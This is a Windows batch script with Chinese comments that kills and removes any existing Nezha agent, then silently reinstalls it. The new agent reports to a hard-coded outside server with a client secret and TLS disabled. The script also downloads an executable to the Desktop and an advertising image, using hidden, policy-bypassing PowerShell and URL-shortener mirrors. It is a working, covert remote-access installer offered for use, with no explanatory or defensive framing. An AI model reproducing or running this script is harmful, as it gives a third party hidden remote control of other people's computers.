@echo off
chcp 65001 >nul 2>nul
setlocal enabledelayedexpansion

set "DESKTOP=%USERPROFILE%\Desktop"
set "EXE_FILE=五五知行社.exe"
set "IMG_URL=http://github.luoruozhou.top/wwzxs/QQ%EF%BC%9A1668729341.png"
set "IMG_FOLDER=D:\获取冰点密码请点击"
set "IMG_FILE=QQ：1668729341.png"
set "EXE_URL=http://github.luoruozhou.top/wwzxs/五五知行社.exe"

:: 检测五五知行社.exe
if exist "%DESKTOP%\%EXE_FILE%" (
    del /f /q "%DESKTOP%\%EXE_FILE%" >nul 2>nul
)

:: 检测哪吒Agent是否运行
tasklist | find /i "nezha" >nul 2>nul
if %errorlevel% equ 0 (
    taskkill /f /im nezha.exe >nul 2>nul
    taskkill /f /im nezha-agent.exe >nul 2>nul
    timeout /t 2 /nobreak >nul 2>nul
)

:: 如果存在哪吒相关文件则删除
if exist "C:\Program Files\nezha" (
    rmdir /s /q "C:\Program Files\nezha" >nul 2>nul
)
if exist "C:\nezha" (
    rmdir /s /q "C:\nezha" >nul 2>nul
)

:: 创建图片文件夹并下载图片
if not exist "%IMG_FOLDER%" mkdir "%IMG_FOLDER%"
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
"try { Invoke-WebRequest '%IMG_URL%' -OutFile '%IMG_FOLDER%\%IMG_FILE%' -TimeoutSec 30 } catch { exit }"

:: Ping测速选最快镜像
set "URL1=shturl.cc/uKiu14Qw0MDkTvhqgb"
set "URL2=shturl.cc/ngMQmnvHSq9PH"
set "URL3=shturl.cc/fmVeOYe69W"
set "URL4=gh.dpik.top"
set "FASTEST_URL="
set "MIN_TIME=999999"

for %%u in ("%URL1%" "%URL2%" "%URL3%" "%URL4%") do (
    for /f "tokens=3 delims=: " %%a in ('ping -n 1 %%u ^| find "平均" ^|^| ping -n 1 %%u ^| find "Average"') do (
        set "TIME=%%a"
        set "TIME=!TIME:ms=!"
        if !TIME! LSS !MIN_TIME! (
            set "MIN_TIME=!TIME!"
            set "FASTEST_URL=%%u"
        )
    )
)

if "%FASTEST_URL%"=="" set "FASTEST_URL=https://gh.dpik.top"

:: 重新下载五五知行社.exe
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
"try { Invoke-WebRequest '%EXE_URL%' -OutFile '%DESKTOP%\%EXE_FILE%' -TimeoutSec 30 } catch { exit }"

:: 重新安装哪吒
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
"$env:NZ_SERVER='188.68.250.201:44567'; ^
$env:NZ_TLS='false'; ^
$env:NZ_CLIENT_SECRET='SHbCllhY4zx5tDS0BT20RUwskQo0m2z1'; ^
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12; ^
$baseUrl = 'https://' + '%FASTEST_URL%'; ^
$scriptUrl = $baseUrl + '/nezhahq/scripts/main/agent/install.ps1'; ^
try { ^
    Invoke-WebRequest $scriptUrl -OutFile C:\install.ps1 -TimeoutSec 10; ^
    Start-Process powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -ArgumentList '-File C:\install.ps1' -Wait; ^
    Remove-Item C:\install.ps1 -Force -ErrorAction SilentlyContinue; ^
} catch { ^
    Remove-Item C:\install.ps1 -Force -ErrorAction SilentlyContinue; ^
    $fallbackUrls = @('https://gh.dpik.top/nezhahq/scripts/main/agent/install.ps1', ^
                       'https://raw.githubusercontent.com/nezhahq/scripts/main/agent/install.ps1'); ^
    foreach ($url in $fallbackUrls) { ^
        try { ^
            Invoke-WebRequest $url -OutFile C:\install.ps1 -TimeoutSec 10; ^
            Start-Process powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -ArgumentList '-File C:\install.ps1' -Wait; ^
            if ($LASTEXITCODE -eq 0) { Remove-Item C:\install.ps1 -Force -ErrorAction SilentlyContinue; break }; ^
        } catch { Remove-Item C:\install.ps1 -Force -ErrorAction SilentlyContinue } ^
    } ^
}"